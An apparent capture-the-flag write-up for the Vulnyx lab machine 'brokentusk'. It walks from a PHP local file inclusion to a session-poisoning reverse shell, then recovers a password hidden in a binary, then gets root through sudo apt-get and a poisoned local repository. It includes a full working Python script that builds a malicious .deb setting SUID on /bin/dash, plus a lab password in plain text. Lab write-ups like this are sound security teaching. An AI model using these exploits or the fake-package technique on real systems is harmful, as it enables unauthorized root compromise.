# brokentusk

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| brokentusk | Linux | zer0arc4 | hard | vulnyx |

**Summary:** I found the target at 192.168.0.8 with arp-scan, and nmap showed only SSH on 22 and nginx serving a PHP 8.0.30 site called BrokenTusk. A gobuster run against the web root turned up `vuln.php`, and the PHP warning it leaked told me the page includes a file from user input, so I confirmed a full local file inclusion with `?page=/etc/passwd`. My first attempts to turn the LFI into code execution failed: a PHP filter chain exploit died because the machine had no iconv extension, and log poisoning was useless because the nginx logs were empty. Since the host ran PHP 8.0.30, I used the php2shell research PoC (session-based LFI to RCE) and got a shell as www-data. Enumerating `/opt` revealed a root-owned binary called `passgoblin` that wanted a secret key, and `strings` on it leaked a base64 blob that decoded to `COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS`. Feeding that key back into the binary printed the SSH password for zer0arc4, and I logged in over SSH as the user. As zer0arc4 I could run `apt-get update` and `apt-get upgrade` with sudo and no password, so I built a malicious local APT repository serving a fake `bash` package, pointed `http_proxy` at it, and let `apt-get upgrade` install my postinst script, which set the SUID bit on `/bin/dash` and gave me a root shell. Both flags followed.

---

## Reconnaissance

I started by mapping the local subnet with arp-scan to find the machine's IP.

```zsh
❯ arp-scan 192.168.0.0/24
Interface: wlan0, type: EN10MB, MAC: 18:cc:18:d5:c7:df, IPv4: 192.168.0.7
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     40:ee:15:2c:0b:c4       Zioncom Electronics (Shenzhen) Ltd.
192.168.0.8     08:00:27:d2:de:14       PCS Systemtechnik GmbH
192.168.0.2     90:31:4b:79:86:c5       AltoBeam Inc.
192.168.0.4     6a:2d:99:cb:c4:db       (Unknown: locally administered)
192.168.0.4     6a:12:2c:ee:48:79       (Unknown: locally administered) (DUP: 2)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.431 seconds (105.31 hosts/sec). 4 responded
❯ ip=192.168.0.8
❯ ping -c 2 $ip
PING 192.168.0.8 (192.168.0.8) 56(84) bytes of data.
64 bytes from 192.168.0.8: icmp_seq=1 ttl=64 time=0.683 ms
64 bytes from 192.168.0.8: icmp_seq=2 ttl=64 time=0.600 ms

--- 192.168.0.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1053ms
rtt min/avg/max/mdev = 0.600/0.641/0.683/0.041 ms
```

The 192.168.0.8 host answered, so I saved its address in `$ip` and did a full port scan.

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-15 08:00 +0700
Nmap scan report for 192.168.0.8
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.85 seconds
```

Only SSH and HTTP. I ran a version and script scan on those two ports to learn what was serving them.

```zsh
❯ nmap -p22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-15 08:01 +0700
Nmap scan report for 192.168.0.8
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: BrokenTusk | Wildlife Rescue Foundation
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

The title "BrokenTusk | Wildlife Rescue Foundation" and the PHPSESSID cookie pointed at a PHP application behind nginx. whatweb confirmed the exact PHP version, which I knew would matter later.

```zsh
❯ whatweb $ip
ERROR Opening: https://192.168.0.8 - Connection refused - connect(2) for "192.168.0.8" port 443
http://192.168.0.8 [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.0.8], PHP[8.0.30], Script, Title[BrokenTusk | Wildlife Rescue Foundation], X-Powered-By[PHP/8.0.30], nginx
```

## Initial Access

### LFI to RCE via PHP Session Poisoning

Next I enumerated the web root with gobuster, filtering out a huge default page and the usual 403/404 noise.

```zsh
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php --exclude-length 26659 -b 403,404
                                                                                   ===============================================================                    Gobuster v3.8.2                                                                    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   403,404
[+] Exclude Length:          26659
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
api                  (Status: 301) [Size: 162] [--> http://192.168.0.8/api/]
app                  (Status: 301) [Size: 162] [--> http://192.168.0.8/app/]
vuln.php             (Status: 200) [Size: 223]
Progress: 14256 / 14256 (100.00%)
===============================================================
Finished
===============================================================
```

`vuln.php` with its tiny 223-byte response looked like the intended entry point, so I requested it directly.

```zsh
❯ curl -i http://$ip/vuln.php
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 15 Nov 2026 01:06:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30


Warning: include(home): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'home' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3
```

The PHP warnings gave it away: line 3 runs `include()` on user-controlled input, defaulting to `home`. That is a local file inclusion, I just had to find the parameter name. ffuf with the same common list found it quickly.

```zsh
❯ ffuf -u "http://$ip/vuln.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 223
                                                                                                             /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       git-20260926-8d65e037
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.8/vuln.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 223
________________________________________________

page                    [Status: 200, Size: 1237, Words: 12, Lines: 25, Duration: 29ms]
::: Progress: [4752/4752] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:03] :: Errors: 0 :
```

The parameter is `page`, and fetching `/etc/passwd` through it confirmed the LFI and showed me a real user on the box.

```zsh
❯ curl -i "http://$ip/vuln.php?page=/etc/passwd"
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 15 Nov 2026 01:08:33 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

At this point I had an LFI and wanted RCE. I tried the PHP filter chain technique from synacktiv first, and it failed because the machine does not have the iconv extension enabled. I also tried log poisoning, and that failed too because the nginx logs were empty, so nothing I wrote would ever be parsed. Since the host runs PHP 8.0.30, which is vulnerable to php2shell, I went with the session-based LFI to RCE approach from the php2shell research: `https://github.com/TheCyberGeek/php2shell-research/tree/main/A_session_lfi`. The idea is to poison a PHP session file with a payload, then include the session file through the same LFI to execute it. I set up my listener before running the exploit.

```zsh
❯ nc -lvnp 9999
Listening on 0.0.0.0 999
```

```zsh
❯ python3 chain_a_session_lfi.py --target http://$ip --lfi-path /vuln.php --session-path /tmp/sessions --lhost 192.168.0.7 --lport 9999
[*] Target: http://192.168.0.8:80                                                                    [*] Reverse shell -> 192.168.0.7:9999  (start your listener first)
[attempt 1] SID=exploit968b5c3ecdbf4915b982 file=/tmp/sessions/sess_exploit968b5c3ecdbf4915b982
[+] reverse shell fired via /tmp/sessions/sess_exploit968b5c3ecdbf4915b982 -> 192.168.0.7:9999
    check your listener
```

It worked on the first attempt, and I caught a shell as www-data.

```zsh
Connection received on 192.168.0.8 47790
bash: cannot set terminal process group (668): Inappropriate ioctl for device
bash: no job control in this shell
www-data@BrokenTusk:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

### passgoblin binary to zer0arc4 credentials

With a foothold as www-data I went looking for anything unusual, and `/opt` had a root-owned binary named `passgoblin` sitting next to a `php2shell` directory.

```zsh
www-data@BrokenTusk:~/html$ cd /opt
cd /opt
www-data@BrokenTusk:/opt$ ls -la
ls -la
total 28
drwxr-xr-x  3 root root  4096 Oct 31 17:19 .
drwxr-xr-x 18 root root  4096 Nov  3 03:58 ..
-rwxr-xr-x  1 root root 14512 Oct 31 17:19 passgoblin
drwxr-xr-x  5 root root  4096 Nov 14 19:56 php2shell
www-data@BrokenTusk:/opt$ ./passgoblin
./passgoblin
hell
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Access Denied! Invalid Secret Key.
```

The binary greets zer0arc4 by name and asks for a secret key before revealing credentials, which sounded exactly like what I needed for SSH. I had no key, so I ran `strings` over the binary and looked for anything readable among the imports and format strings.

```zsh
www-data@BrokenTusk:/opt$ strings passgoblin
strings passgoblin
]J.A
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
strcspn
__libc_start_main
__cxa_finalize
strchr
memset
printf
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
ABCDEFGHH
IJKLMNOPH
QRSTUVWXH
YZabcdefH
ghijklmnH
opqrstuvH
wxyz0123H
456789+/H
ggWelcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT
Access Granted!
Username: zer0arc4
Password: %s
The key said hello, the password said goodbye to its privacy.
Access Denied! Invalid Secret Key.
;*3$"
GCC: (Debian 16.2.0-1) 16.2.0
.shstrtab
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.gnu.property
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

The alphabet fragments in the strings output showed a base64 table, and one long base64-looking line sat right between the prompts. I decoded it locally.

```zsh
❯ echo 'Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT' | base64 -d
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
```

That had to be the secret key, and feeding it to the binary proved it: it printed zer0arc4's password.

```zsh
www-data@BrokenTusk:/opt$ ./passgoblin
./passgoblin
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Access Granted!
Username: zer0arc4
Password: TooBigToHide123!

The key said hello, the password said goodbye to its privacy.
```

SSH was open from my first port scan, so I logged in as zer0arc4 with that password and confirmed my position.

```zsh
❯ ssh zer0arc4@$ip
zer0arc4@192.168.0.8's password:
zer0arc4@BrokenTusk:~$ id;whoami;hostname
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
zer0arc4
BrokenTusk
```

## Privilege Escalation

### sudo apt-get update/upgrade to root via malicious local repo

First thing as zer0arc4, I checked what sudo would give me.

```zsh
zer0arc4@BrokenTusk:~$ sudo -l
Matching Defaults entries for zer0arc4 on BrokenTusk:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy", mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on BrokenTusk:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

Two commands with NOPASSWD, and one detail in the sudoers defaults stood out: `http_proxy` is kept in the environment. That means when I run `apt-get update` under sudo, apt talks to whatever HTTP proxy I point it at, so I can serve it my own repository metadata and packages. I wrote a script that builds a fake `bash` package with a higher version number than anything in the real repos, serves it from a local Python HTTP server on 127.0.0.1:8081 (answering only `Packages` and `.deb` requests, 404ing the InRelease files so apt falls back to the unauthenticated path), runs `sudo apt-get update` and `sudo apt-get upgrade` with the proxy pointed at my server, and then pops a root shell through the SUID dash that my postinst script leaves behind.

```python
#!/usr/bin/env python3
import os
import subprocess
import threading
import http.server
import socketserver
import hashlib
import shutil

def main():
    print("[*] 1. Setting up directories...")
    os.system("rm -rf /tmp/bashpwn /tmp/repo")
    os.makedirs("/tmp/bashpwn/DEBIAN", exist_ok=True)
    os.makedirs("/tmp/bashpwn/bin", exist_ok=True)
    os.makedirs("/tmp/repo", exist_ok=True)

    print("[*] 2. Creating malicious .deb package...")
    shutil.copy("/bin/dash", "/tmp/bashpwn/bin/bash")
    os.chmod("/tmp/bashpwn/bin/bash", 0o755)

    with open("/tmp/bashpwn/DEBIAN/control", "w") as f:
        f.write("""Package: bash
Version: 100011
Section: shells
Priority: required
Architecture: all
Maintainer: attacker
Description: bash
""")

    with open("/tmp/bashpwn/DEBIAN/postinst", "w") as f:
        f.write("""#!/bin/sh
cp /bin/dash /bin/bash
chown root:root /bin/bash
chmod 755 /bin/bash
chown root:root /bin/sh
chmod +s /bin/sh
chown root:root /bin/dash
chmod +s /bin/dash
""")
    os.chmod("/tmp/bashpwn/DEBIAN/postinst", 0o755)

    subprocess.run(
        ["dpkg-deb", "--build", "/tmp/bashpwn", "/tmp/repo/pwn.deb"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )

    print("[*] 3. Generating Packages file...")
    with open("/tmp/repo/pwn.deb", "rb") as f:
        data = f.read()
    
    size = len(data)
    md5 = hashlib.md5(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()

    with open("/tmp/repo/Packages", "w") as f:
        f.write(f"""Package: bash
Version: 100011
Architecture: all
Maintainer: attacker
Filename: pwn.deb
Size: {size}
MD5sum: {md5}
SHA256: {sha256}
Description: bash
""")

    print("[*] 4. Starting Python HTTP Proxy...")
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if "InRelease" in self.path or "Release" in self.path or "Packages." in self.path:
                self.send_error(404)
            elif "Packages" in self.path:
                with open('/tmp/repo/Packages', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            elif ".deb" in self.path:
                with open('/tmp/repo/pwn.deb', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/vnd.debian.binary-package')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_error(404)

        def log_message(self, format, *args):
            pass

    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("127.0.0.1", 8081), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    print("[*] 5. Executing APT Exploit...")
    env = os.environ.copy()
    env["http_proxy"] = "http://127.0.0.1:8081"
    env.pop("https_proxy", None)

    subprocess.run(["sudo", "apt-get", "update"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sh", "-c", "yes | sudo apt-get upgrade"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    httpd.shutdown()
    print("[*] 6. Automatically elevating to full root shell...")
    
    elev_cmd = 'python3 -c \'import os; os.setgroups([]); os.setgid(0); os.setuid(0); os.execv("/bin/sh", ["/bin/sh"])\''
    
    try:
        subprocess.run(["/bin/sh", "-p", "-c", elev_cmd])
    except Exception as e:
        print(f"[-] Elevation failed: {e}")
        print("[!] Try running manually: /bin/sh -p")

if __name__ == "__main__":
    main()
```

I dropped the script in `/tmp/pwn.py` and ran it.

```zsh
zer0arc4@BrokenTusk:~$ python3 /tmp/pwn.py
[*] 1. Setting up directories...
[*] 2. Creating malicious .deb package...
[*] 3. Generating Packages file...
[*] 4. Starting Python HTTP Proxy...
[*] 5. Executing APT Exploit...
[*] 6. Automatically elevating to full root shell...
# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
BrokenTusk
```

Root. The upgrade installed my fake bash package, its postinst made `/bin/dash` SUID, and the script's final step used it to become uid 0. Then I grabbed both flags.

```zsh
# cat /home/zer0arc4/user.txt /root/root.txt
9346e4474996a9ba8cc5248f4e5051c5
65742587f1d6944b0ed55f6c1d311e21
```

## Attack Chain Summary

Looking back, every phase of this chain had a specific root cause I could point at. The LFI existed because `vuln.php` runs `include()` directly on the `page` parameter with no sanitization, a code flaw, and closing it means removing the parameter or allowing only a fixed list of page names. Even with that flaw, the usual RCE paths were shut: the machine had no iconv extension and the nginx logs were empty, but the stale PHP 8.0.30 install (a software version issue the logs confirm via `X-Powered-By`) still exposed the session-file route, so keeping PHP on a supported version closes that door. `passgoblin` fell because its secret key was embedded in the binary's `.rodata` section as plain base64, a design weakness that `strings` defeats in seconds; the key belongs outside the binary, in a root-readable file or a proper secret store. Finally, the root escalation came from a sudo misconfiguration: passwordless `apt-get update` and `apt-get upgrade` combined with `env_keep+="http_proxy"` let me control where root's apt fetched its metadata from, and the package index I served carried no signature enforcement, so the fake `bash` package installed as-is. Dropping `http_proxy` from `env_keep` and requiring signed repository metadata would have stopped this attack cold.
